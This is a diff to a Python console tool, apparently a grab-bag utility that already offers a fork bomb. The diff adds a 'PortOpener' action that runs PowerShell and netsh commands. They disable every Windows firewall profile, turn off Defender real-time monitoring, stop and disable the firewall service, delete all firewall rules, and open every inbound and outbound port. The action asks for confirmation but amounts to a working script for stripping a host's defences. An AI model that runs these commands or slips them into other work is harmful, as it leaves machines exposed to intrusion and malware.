@@ -133,6 +133,7 @@ while True:
     sleep(0.1)
     print("ForkBomb) Attempt a forkbomb on current machine")
     sleep(0.1)
+    print("PortOpener) Open ports in firewall and takes down windows defender protection")
     print(" ")
     sleep(0.1)
     print("exit) To exit the program")
@@ -145,7 +146,7 @@ while True:
     print_line()
     sleep(0.1)
     print("")
-    action = input("M0L€> ")
+    action = input("M0L€> " + "")
     cls()
 
     
@@ -168,7 +169,7 @@ while True:
 #Action help = showing available actions
     if action == "help":
         logging.info(f"Chosen action help to show available actions")
-        print(Fore.YELLOW + "Choose action manual: ")
+        print(Fore.YELLOW + "Available actions: ")
         sleep(0.1)
         print_line()
         print(" ")
@@ -224,6 +225,7 @@ while True:
         print("exit) To exit the program")
         sleep(0.1)
         print("")
+        print("PortOpener) Open ports in firewall, takes down windows defender protection. deletes all existing firewall rules")
         print_line()
         input("Press Enter to continue...")
 
@@ -882,7 +884,61 @@ while True:
     # 
 
 
-    #Action exit = exiting the program
+    if action == "PortOpener":
+        logging.info(f"Chosen action PortOpener to open ports in firewall")
+        PortOpenerContinue=input("This action will take down the entire firewall and windows defender protection, are you sure you want to continue?")
+        if PortOpenerContinue == "y":
+            disablefirewall="Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False"
+            run_ps(disablefirewall)
+            logging.warning(f"Firewall disabled by user")
+            sleep(1)
+            disabledefender="Set-MpPreference -DisableRealtimeMonitoring $true"
+            run_ps(disabledefender)
+            logging.warning(f"Windows Defender real-time monitoring disabled by user")
+            MpsSvcStop="sc config MpsSvc start= disabled"
+            run_ps(MpsSvcStop)
+            logging.warning(f"Windows Defender service disabled by user")
+            stopMpsSvc="net stop MpsSvc"
+            run_ps(stopMpsSvc)
+            logging.warning(f"Windows Defender service stopped by user")
+            ruledelete="netsh advfirewall firewall delete rule name=all"
+            run_ps(ruledelete)
+            logging.warning(f"All firewall rules deleted by user")
+            print("Firewall and Windows Defender protection disabled")
+            sleep(2)
+            inboundtcp='netsh advfirewall firewall add rule name="OPEN_ALL_TCP_IN" dir=in action=allow protocol=TCP localport=1-65535'
+            run_ps(inboundtcp)
+            logging.info(f"All inbound TCP ports opened by user")
+            inboundudp='netsh advfirewall firewall add rule name="OPEN_ALL_UDP_IN" dir=in action=allow protocol=UDP localport=1-65535'
+            run_ps(inboundudp)
+            logging.info(f"All inbound UDP ports opened by user")
+            inboundall='netsh advfirewall firewall add rule name="OPEN_ALL_PROTOCOLS_IN" dir=in action=allow protocol=any'
+            run_ps(inboundall)
+            logging.info(f"All inbound protocols opened by user")
+            outboundall='netsh advfirewall firewall add rule name="OPEN_ALL_OUT" dir=out action=allow protocol=any'
+            run_ps(outboundall)
+            logging.info(f"All outbound protocols opened by user")
+            print("All ports opened in firewall")
+            input("Press Enter to continue...")
+        else:
+            logging.info(f"User chose not to disable firewall and defender")
+            print("Will not continue...")
+            sleep(2)
+            input("Press Enter to continue...")
+
+
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+
+   #Action exit = exiting the program
     if action == "exit":
         logging.info(f"Chosen action PassExport to exit the program")
         print("Exiting the program...")
@@ -980,6 +1036,15 @@ while True:
         sleep(0.1)
         input("Press Enter to continue...")
         cls()
+
+    if action == "info PortOpener":
+        print("PortOpener) Open ports in firewall: disables Windows Firewall and Windows Defender real-time protection, deletes all existing firewall rules") 
+        sleep(0.1) 
+        print("")
+        sleep(0.1)
+        input("Press Enter to continue...")
+        cls()
+    
 
     else:
         print("Invalid action, please choose a valid command or select 'help' to see available actions.")
